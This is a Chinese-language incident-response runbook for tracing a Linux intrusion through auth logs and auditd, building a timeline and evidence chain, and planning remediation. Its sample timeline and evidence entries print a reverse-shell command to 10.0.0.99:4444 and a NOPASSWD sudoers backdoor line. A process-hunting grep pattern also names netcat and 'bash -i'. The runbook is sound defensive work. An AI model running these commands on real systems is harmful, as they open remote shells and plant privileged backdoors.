# 入侵事件追溯流程

## 场景描述

系统疑似被入侵，需要追溯攻击者的完整操作链，还原攻击过程，收集证据。

---

## 完整操作流程

### 阶段 1：现场保护与初步评估

#### 1.1 确认入侵迹象

```bash
# 快速检查异常登录
last -ai | head -20
lastb -ai | head -20

# 检查当前活动用户
w
who

# 检查可疑进程
ps auxf | grep -v grep | grep -iE "nc |ncat|bash -i|/tmp/|/dev/shm/|python.*-c|perl.*-e"
```

#### 1.2 保护现场

```bash
# 记录当前系统状态
OUTFILE="/tmp/incident_$(hostname)_$(date +%Y%m%d_%H%M%S).txt"
date > "$OUTFILE"
ps auxf >> "$OUTFILE"
ss -tunap >> "$OUTFILE"
last -ai >> "$OUTFILE"

# 保护审计日志（防止攻击者删除）
cp -a /var/log/audit/ /tmp/audit_backup_$(date +%Y%m%d_%H%M%S)/
cp -a /var/log/secure /tmp/secure_backup_$(date +%Y%m%d_%H%M%S)
```

---

### 阶段 2：确定追溯范围

#### 2.1 确定时间窗口

```bash
# 查找最早的异常迹象
# 方法 1: 检查首次异常登录
last -ai | tail -20

# 方法 2: 检查审计日志最早异常
ausearch -m USER_AUTH --just-failures -ts this-month 2>/dev/null | head -5

# 方法 3: 检查 /var/log/secure 中的首次失败
grep "Failed password" /var/log/secure | head -5
```

#### 2.2 确定攻击来源

```bash
# 统计失败登录 IP
grep "Failed password" /var/log/secure | \
  awk '{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' | sort | uniq -c | sort -rn

# 统计成功登录 IP
last -ai | awk '{print $NF}' | sort | uniq -c | sort -rn
```

---

### 阶段 3：多源日志收集

#### 3.1 使用收集脚本

```bash
# 设置时间范围（根据阶段 2 确定）
START_TIME="2024-01-15 00:00:00"
END_TIME="2024-01-16 00:00:00"
OUTPUT_DIR="/tmp/incident_$(date +%Y%m%d_%H%M%S)"

bash scripts/collect_audit_logs.sh \
  -S "$START_TIME" \
  -E "$END_TIME" \
  -o "$OUTPUT_DIR"
```

#### 3.2 手动补充收集

```bash
# 收集特定用户的操作
ausearch -ua {suspicious_user} -ts "$START_TIME" -te "$END_TIME"

# 收集特定 IP 的活动
ausearch -ts "$START_TIME" -te "$END_TIME" | grep "{suspicious_ip}"

# 收集文件变更
ausearch -m PATH -ts "$START_TIME" -te "$END_TIME" | grep -E "passwd|shadow|sudoers"

# 收集网络连接
ausearch -m SOCKADDR -ts "$START_TIME" -te "$END_TIME"
```

---

### 阶段 4：时间线构建

#### 4.1 使用时间线脚本

```bash
bash scripts/build_timeline.sh -d "$OUTPUT_DIR" -o "$OUTPUT_DIR/timeline.txt"
```

#### 4.2 时间线格式

```
[2024-01-15 14:22:50] [AUTH] Failed password for admin from 192.168.1.100 port 22
[2024-01-15 14:22:55] [AUTH] Failed password for admin from 192.168.1.100 port 22
[2024-01-15 14:23:01] [AUTH] Failed password for admin from 192.168.1.100 port 22
[2024-01-15 14:23:05] [AUTH] Accepted publickey for admin from 192.168.1.100 port 22
[2024-01-15 14:23:10] [EXEC] uid=1000 sudo useradd -m backdoor_user
[2024-01-15 14:23:15] [FILE] uid=0 write /etc/passwd
[2024-01-15 14:23:20] [EXEC] uid=1000 sudo echo "backdoor_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
[2024-01-15 14:23:25] [FILE] uid=0 write /etc/sudoers
[2024-01-15 14:23:30] [NET] pid=12345 connect to 10.0.0.99:4444
[2024-01-15 14:23:35] [EXEC] uid=0 bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
```

---

### 阶段 5：攻击链还原

#### 5.1 分析认证阶段

```bash
# 检查暴力破解
grep "Failed password" /var/log/secure | grep "{attacker_ip}"

# 检查登录方式
grep "Accepted" /var/log/secure | grep "{attacker_ip}"

# 检查登录后的时间线
ausearch -m USER_LOGIN -ts "$START_TIME" -te "$END_TIME"
```

#### 5.2 分析提权阶段

```bash
# 检查 sudo 使用
grep "sudo:" /var/log/secure | grep "{attacker_user}"

# 检查用户创建
ausearch -m ADD_USER -ts "$START_TIME" -te "$END_TIME"

# 检查 sudoers 修改
ausearch -k sudoers_change -ts "$START_TIME" -te "$END_TIME"
```

#### 5.3 分析持久化阶段

```bash
# 检查 SSH 密钥添加
ausearch -k ssh_key_change -ts "$START_TIME" -te "$END_TIME"

# 检查 cron 修改
ausearch -k cron_change -ts "$START_TIME" -te "$END_TIME"

# 检查 systemd service 添加
ausearch -k systemd_change -ts "$START_TIME" -te "$END_TIME"
```

#### 5.4 分析横向移动

```bash
# 检查 SSH 出站连接
ausearch -m EXECVE -ts "$START_TIME" -te "$END_TIME" | grep "ssh "

# 检查网络扫描
ausearch -m EXECVE -ts "$START_TIME" -te "$END_TIME" | grep -iE "nmap|masscan|fscan"
```

---

### 阶段 6：证据链固化

#### 6.1 使用证据链生成脚本

```bash
bash scripts/generate_evidence_chain.sh -d "$OUTPUT_DIR" -o "$OUTPUT_DIR/evidence_chain.md"
```

#### 6.2 证据链格式

```markdown
## 证据链

### 事件 1: 暴力破解
- 时间: 2024-01-15 14:22:50 - 14:23:01
- 证据: /var/log/secure "Failed password for admin from 192.168.1.100"
- 次数: 3 次失败尝试
- 结果: 第 4 次成功登录

### 事件 2: 未授权 SSH 登录
- 时间: 2024-01-15 14:23:05
- 证据: /var/log/secure "Accepted publickey for admin from 192.168.1.100"
- audit ID: audit(1705312985.123:456)
- 关联: 前有 3 次失败尝试

### 事件 3: 创建后门用户
- 时间: 2024-01-15 14:23:10
- 证据: audit.log type=EXECVE uid=1000 comm="sudo" exe="/usr/bin/sudo"
- 命令: sudo useradd -m backdoor_user
- 结果: /etc/passwd 被修改（audit ID: 1705312990.789:012）

### 事件 4: 提权配置
- 时间: 2024-01-15 14:23:20
- 证据: audit.log type=PATH name="/etc/sudoers"
- 命令: sudo echo "backdoor_user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
- 结果: sudoers 文件被修改

### 事件 5: 反弹 Shell
- 时间: 2024-01-15 14:23:30
- 证据: audit.log type=SOCKADDR saddr=10.0.0.99:4444
- 命令: bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
- 结果: 建立到攻击者机器的反向连接
```

---

### 阶段 7：报告生成

#### 7.1 使用报告模板

使用 `assets/incident-report-template.md` 模板，填充以下内容：

1. **事件概述**: 发现时间、影响范围、攻击来源
2. **时间线**: 完整事件时间线
3. **攻击链还原**: 攻击者的完整操作步骤
4. **证据链**: 每步操作的审计证据
5. **影响评估**: 被篡改的文件、创建的后门、数据泄露风险
6. **处置建议**: 紧急处置步骤、修复措施、预防建议

#### 7.2 生成报告

```bash
bash scripts/generate_audit_report.sh \
  --type incident \
  -d "$OUTPUT_DIR" \
  -o "$OUTPUT_DIR/incident_report.md"
```

---

## 处置建议清单

### 紧急处置（立即执行）

- [ ] 隔离受感染主机（断网或防火墙隔离）
- [ ] 封锁攻击源 IP
- [ ] 禁用后门账户
- [ ] 撤销被植入的 SSH 密钥
- [ ] 恢复 sudoers 配置

### 修复措施（短期）

- [ ] 重置所有受影响用户密码
- [ ] 更新 SSH 密钥对
- [ ] 修复被篡改的配置文件
- [ ] 清除恶意 cron 任务和 systemd 服务
- [ ] 更新系统补丁

### 预防措施（长期）

- [ ] 部署审计规则（使用 audit_setup.sh）
- [ ] 启用 AIDE 文件完整性监控
- [ ] 配置 fail2ban 防暴力破解
- [ ] 加强 SSH 安全配置
- [ ] 部署入侵检测系统
